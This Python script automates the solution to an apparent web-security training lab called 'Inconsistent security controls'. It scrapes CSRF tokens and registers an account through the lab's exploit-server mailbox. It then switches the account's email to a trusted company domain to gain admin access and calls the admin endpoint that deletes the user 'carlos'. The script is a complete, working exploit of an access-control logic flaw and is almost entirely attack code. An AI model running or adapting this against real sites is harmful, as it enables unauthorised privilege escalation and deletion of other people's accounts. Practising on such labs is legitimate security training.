# Inconsistent security controls

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def find_admin_panel(s, url):
	print('\n[+] Trying to access to the Admin Panel...')
	admin_path = url + '/admin'
	r = s.get(admin_path)
	time.sleep(1)
	response = re.search(rb"</header>\n                    (.*)\n                </div>", r.text.encode()).group(1).decode().strip()
	print('[+] Server response:')
	print(response)

def register(s, url, attacker):
	print('\n[+] Trying to register...')
	register_path = url + '/register'
	mail_path = 'https://' + attacker + '/email'
	r = s.get(register_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	register_data = {
		'csrf': csrf_token,
		'username': 'gwyo',
		'email': 'gwyo@' + attacker,
		'password': 'Password123!'
		}
	r = s.post(register_path, data=register_data)
	r = s.get(mail_path)
	time.sleep(1)
	register_token = re.findall(r"/register\?temp-registration-token=(.*)' target=_blank", r.text)[-1]
	registeration_path = url + '/register?temp-registration-token=' + register_token
	r = s.get(registeration_path)
	time.sleep(1)
	if 'Account registration successful!' in r.text:
		print('[+] Account registration successful !')
		return r

def change_email(s, url):
	print('\n[+] Trying to login with created account...')
	login_path = url + '/login'
	change_email_path = url + '/my-account/change-email'
	r = s.get(login_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {
		'username': 'gwyo',
		'password': 'Password123!',
		'csrf': csrf_token
	}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	if 'Your username is: ' in r.text:
		print('\n[+] Successfully logged in !')
	csrf_token = get_csrf_token(r)
	change_email_data = {
		'email': 'gwyo@dontwannacry.com',
		'csrf': csrf_token
	}
	r = s.post(change_email_path, data=change_email_data)
	time.sleep(1)
	if 'Your email is: gwyo@dontwannacry.com' in r.text:
		print('\n[+] Successfully updated email to "gwyo@dontwannacry.com" !')
	return r

def delete_carlos(s, url):
	print('\n[+] Trying to access to the Admin Panel...')
	admin_path = url + '/admin'
	delete_path = url + '/admin/delete?username=carlos'
	r = s.get(admin_path)
	time.sleep(1)
	if r.status_code == 200:
		print('\n[+] Trying to delete Carlos user...')
		r = s.get(delete_path)


def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Email client", r.text):
		srv = re.search(r"href='(.*)'>Email client", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Inconsistent security controls')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			exploit_srv = find_exploit_srv(r)
			attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = find_admin_panel(s, url)
			r = register(s, url, urllib.parse.urlparse(exploit_srv).netloc)
			r = change_email(s, url)
			r = delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
